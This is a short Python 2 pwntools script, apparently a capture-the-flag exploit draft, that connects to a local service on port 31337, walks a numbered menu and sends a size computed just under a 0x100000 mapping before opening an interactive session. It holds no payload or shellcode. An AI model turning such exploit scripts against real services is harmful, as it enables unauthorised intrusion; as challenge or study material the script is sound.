from pwn import *

HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

menu = lambda: r.recvuntil('Command:\n')
ii = lambda x: r.sendline(str(x))

MAP_SIZE = 0x100000
raw_input('>> ')
menu()
ii(2)
ii(1)
ii(3)
ii(MAP_SIZE - 16 - 56 - 8 * 1)
ii('')
for i in range(1):
	print menu()
	ii(1)

r.interactive()